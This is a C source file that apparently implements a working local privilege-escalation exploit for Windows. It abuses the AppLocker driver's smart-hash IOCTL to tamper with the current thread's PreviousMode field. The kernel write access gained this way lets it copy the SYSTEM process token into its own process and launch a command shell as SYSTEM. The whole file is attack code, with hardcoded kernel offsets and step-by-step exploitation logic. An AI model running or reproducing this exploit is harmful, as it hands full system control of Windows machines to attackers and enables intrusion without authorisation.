#include <Windows.h>
#include <winternl.h>
#include <stdio.h>
#include <processthreadsapi.h>
#include <TlHelp32.h>
#include <stdint.h>
#include <psapi.h>
#include <string.h>
#include "headers.h"

typedef NTSTATUS(WINAPI* pNtImpersonateThread)(HANDLE ThreadHandle, HANDLE ThreadToImpersonate, SECURITY_QUALITY_OF_SERVICE* SecurityQualityOfService);
typedef NTSTATUS(WINAPI* pNtQuerySystemInformation)(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
typedef NTSTATUS(WINAPI* pNtWriteVirtualMemory)(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, ULONG NumberOfBytesToWrite, PULONG NumberOfBytesWritten OPTIONAL);


#define IOCTL_SMART_HASH 0x22A018
#define STATUS_INFO_LENGTH_MISMATCH 0xC0000004
#define SystemHandleInformation ((SYSTEM_INFORMATION_CLASS)16)
#define Offset_ExpProfileDelete 0x009f5ce0
#define Offset_PreviousMode 0x232
#define Offset_Token 0x4b8

DWORD64 ntoskrnl_base = 0;

typedef struct SMART_HASH_INPUT {
    DWORD64 Arguments_Ptr;
    PVOID Object_Ptr;
    PVOID ExpProfileDelete_Ptr;
    DWORD64 PADDING;
} _SMART_HASH_INPUT, * PSMART_HASH_INPUT;

DWORD GetProcessThreadID(DWORD PID)
{
    THREADENTRY32 te32 = { 0 };
    HANDLE hThreadSnap;

    hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    te32.dwSize = sizeof(THREADENTRY32);
    Thread32First(hThreadSnap, &te32);

    do
    {
        if (te32.th32OwnerProcessID == PID)
        {
            printf("[+] First Thread ID of the process: %d\n", te32.th32ThreadID);
            return te32.th32ThreadID;
        }
    } while (Thread32Next(hThreadSnap, &te32));

    return ERROR_FILE_NOT_FOUND;
}

DWORD64 GetBaseAddr(LPCWSTR name)
{
    BOOL status;
    LPVOID* pImageBase;
    DWORD ImageSize;
    WCHAR driverName[1024];
    DWORD64 driverBase = 0;

    status = EnumDeviceDrivers(nullptr, 0, &ImageSize);

    pImageBase = (LPVOID*)VirtualAlloc(nullptr, ImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

    status = EnumDeviceDrivers(pImageBase, ImageSize, &ImageSize);

    int driver_count = ImageSize / sizeof(pImageBase[0]);

    for (int i = 0; i < driver_count; i++) {
        GetDeviceDriverBaseNameW(pImageBase[i], driverName, sizeof(driverName) / sizeof(char));

        if (!wcscmp(name, driverName)) {
            driverBase = (DWORD64)pImageBase[i];
            break;
        }
    }

    return driverBase;
}

PVOID FindObject(int pid, HANDLE dHandle) {

    pNtQuerySystemInformation NtQuerySystemInformation = (pNtQuerySystemInformation)GetProcAddress(
        GetModuleHandle(L"ntdll.dll"), "NtQuerySystemInformation");

    if (!NtQuerySystemInformation) {
        printf("[-] Unable to find ntdll!NtQuerySystemInformation\n");
        return FALSE;
    }

    ULONG returnLen = 0x1000;
    NTSTATUS status;

    PSYSTEM_HANDLE_INFORMATION SystemHandleInfo = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)returnLen);

    do {
        if (SystemHandleInfo) {
            HeapFree(GetProcessHeap(), 0, SystemHandleInfo);
        }

        SystemHandleInfo = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, returnLen);
        if (!SystemHandleInfo) {
            printf("[-] HeapAlloc Failed With Error: %d\n", GetLastError());
            return FALSE;
        }

        status = NtQuerySystemInformation(SystemHandleInformation, SystemHandleInfo, returnLen, &returnLen);
    } while (status == STATUS_INFO_LENGTH_MISMATCH);

    PVOID dKTHREAD = NULL;
    for (ULONG i = 0; i < SystemHandleInfo->NumberOfHandles; i++)
    {
        if (SystemHandleInfo->Handles[i].UniqueProcessId == pid)
        {
            if (dHandle == (HANDLE)SystemHandleInfo->Handles[i].HandleValue)
            {
                dKTHREAD = SystemHandleInfo->Handles[i].Object;
                free(SystemHandleInfo);
                break;
            }
        }
    }
    // HeapFree(GetProcessHeap(), 0, SystemHandleInfo);
    return dKTHREAD;
}

/*
 * Source: https://stackoverflow.com/a/40390858/1069307
 */
BOOL SetPrivilege(
    HANDLE hToken,          // access token handle
    LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
    BOOL bEnablePrivilege   // to enable or disable privilege
)
{
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!LookupPrivilegeValue(
        NULL,            // lookup privilege on local system
        lpszPrivilege,   // privilege to lookup
        &luid))        // receives LUID of privilege
    {
        printf("LookupPrivilegeValue error: %u\n", GetLastError());
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    if (bEnablePrivilege)
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    else
        tp.Privileges[0].Attributes = 0;

    // Enable the privilege or disable all privileges.

    if (!AdjustTokenPrivileges(
        hToken,
        FALSE,
        &tp,
        sizeof(TOKEN_PRIVILEGES),
        (PTOKEN_PRIVILEGES)NULL,
        (PDWORD)NULL))
    {
        printf("AdjustTokenPrivileges error: %u\n", GetLastError());
        return FALSE;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)

    {
        printf("The token does not have the specified privilege. \n");
        return FALSE;
    }

    return TRUE;
}

BOOL EnableDebugPrivilege()
{
    HANDLE tempTokenHandle;
    HANDLE currentToken;
    BOOL success = OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &tempTokenHandle);
    if (!success)
    {
        printf("[-] Failed to open current process token\n");
        return FALSE;
    }

    currentToken = tempTokenHandle;
    success = SetPrivilege(currentToken, L"SeDebugPrivilege", TRUE);

    if (!success)
    {
        printf("[-] Failed to set SeDebugPrivilege\n");
        return FALSE;
    }

    return TRUE;
}

int wmain(int argc, wchar_t* argv[]) {

    if (argc >= 2 && (wcscmp(argv[1], L"-h") == 0 || wcscmp(argv[1], L"--help") == 0)) {
        wprintf(L"[+] Usage: %ls -p/--pid <LOCAL SERVICE PROCESS PID>\n", argv[0]);
        return 0;
    }

    DWORD threadId;
    if (argc >= 3 && (wcscmp(argv[1], L"-p") == 0 || wcscmp(argv[1], L"--pid") == 0)) {
        DWORD pid = (DWORD)wcstoul(argv[2], NULL, 10);
        wprintf(L"[+] Trying to find Thread ID for the given process PID: %lu\n", pid);
        threadId = GetProcessThreadID(pid);
    }

    BOOL success = EnableDebugPrivilege();
    if (!success)
    {
        printf("[-] EnableDebugPrivilege failed\n");
        return 1;
    }

    // Step 1

    ntoskrnl_base = GetBaseAddr(L"ntoskrnl.exe");
    printf("[+] NT base address %llx\n", ntoskrnl_base);

    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, GetCurrentProcessId());
    PVOID curEPROCESS = FindObject(GetCurrentProcessId(), hProcess);

    if (curEPROCESS == NULL) {
        printf("[-] Unable to find EPROCESS of the current process!\n");
        return 1;
    }

    printf("[+] Found EPROCESS of the current process %p\n", curEPROCESS);

    HANDLE hcurThread = OpenThread(THREAD_QUERY_INFORMATION, TRUE, GetCurrentThreadId());
    PVOID curKTHREAD = FindObject(GetCurrentProcessId(), hcurThread);

    if (curKTHREAD == NULL) {
        printf("[-] Unable to find KTHREAD of the current thread!\n");
        return 1;
    }

    printf("[+] Found KTHREAD of the current thread %p\n", curKTHREAD);

    PVOID sysEPROCESS = FindObject(4, HANDLE(0x4));

    if (sysEPROCESS == NULL) {
        printf("[-] Unable to find EPROCESS of the system.exe\n");
        return 1;
    }

    printf("[+] Found EPROCESS of the system.exe %p\n", sysEPROCESS);

    // Step 2

    HANDLE hThread = OpenThread(THREAD_DIRECT_IMPERSONATION, FALSE, threadId);

    if (hThread == NULL) {
        printf("[-] OpenThread failed with error %d\n", GetLastError());
        return 1;
    }
    else {
        printf("[+] Opened a THREAD_DIRECT_IMPERSONATION handle to the LOCAL_SERVICE process\n");
    }

    pNtImpersonateThread NtImpersonateThread = (pNtImpersonateThread)GetProcAddress(
        GetModuleHandle(L"ntdll.dll"), "NtImpersonateThread");

    if (!NtImpersonateThread) {
        printf("[-] Unable to find ntdll!NtImpersonateThread\n");
        return FALSE;
    }

    SECURITY_QUALITY_OF_SERVICE secquality = { 0 };

    secquality.Length = sizeof(secquality);
    secquality.ImpersonationLevel = SecurityImpersonation;
    NTSTATUS status = NtImpersonateThread(GetCurrentThread(), hThread, &secquality);

    if (status)
    {
        printf("[-] NtImpersonateThread failed with status : %x\n", status);
        return 1;
    }

    // Step 3

    printf("[+] Opening handle to Applocker device\n");

    HANDLE hDevice = CreateFileW(
        L"\\\\.\\AppID",
        GENERIC_READ | GENERIC_WRITE,
        NULL,
        NULL,
        OPEN_EXISTING,
        NULL,
        NULL);

    if (hDevice == INVALID_HANDLE_VALUE)
    {
        printf("[!] Failed to open handle: %d", GetLastError());
        return 1;
    }

    // Step 4

    HANDLE hDummyFile = CreateFileW(L"C:\\Windows\\Temp\\dummy.txt", GENERIC_READ, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    PVOID DummyFileObj = NULL;
    if (hDummyFile != NULL)
    {
        DummyFileObj = FindObject(GetCurrentProcessId(), hDummyFile);
        if (DummyFileObj != NULL)
        {
            printf("[+] Dummy FILE_OBJECT address: %p\n", DummyFileObj);
        }
    }

    DWORD size = 32;
    SMART_HASH_INPUT smart_hash = {0};
    
    smart_hash.Object_Ptr = DummyFileObj;

    PVOID ExpProfileDelete = (PVOID)(ntoskrnl_base + Offset_ExpProfileDelete);
    smart_hash.ExpProfileDelete_Ptr = &ExpProfileDelete;

    smart_hash.Arguments_Ptr = (DWORD64)curKTHREAD + Offset_PreviousMode + 0x30;

    // Step 5

    printf("[+] Calling AipSmartHashImageFile ....");

    NTSTATUS device_status = DeviceIoControl(
        hDevice,
        IOCTL_SMART_HASH,
        &smart_hash,
        size,
        nullptr,
        NULL,
        nullptr,
        nullptr);

    if (device_status) {
        printf("success\n");
    }
    else {
        printf("failed\n");
        return 1;
    }

    // Step 6

    pNtWriteVirtualMemory NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(
        GetModuleHandle(L"ntdll.dll"), "NtWriteVirtualMemory");

    if (!NtWriteVirtualMemory) {
        printf("[-] Unable to find ntdll!NtWriteVirtualMemory\n");
        return FALSE;
    }

    printf("[+] Stealing system's Token..\n");
    NtWriteVirtualMemory(GetCurrentProcess(), PVOID((DWORD64)curEPROCESS + Offset_Token), PVOID((DWORD64)sysEPROCESS + Offset_Token), 0x8, NULL);
    KPROCESSOR_MODE mode = UserMode;

    printf("[+] Replacing KTHREAD.PreviousMode as UserMode..\n");
    NtWriteVirtualMemory(GetCurrentProcess(), PVOID((DWORD64)curKTHREAD + Offset_PreviousMode), &mode, sizeof(mode), NULL);

    printf("[+] Spawning shell as SYSTEM...\n");
    system("cmd.exe");

    CloseHandle(hDevice);
    return 0;

	return 0;
}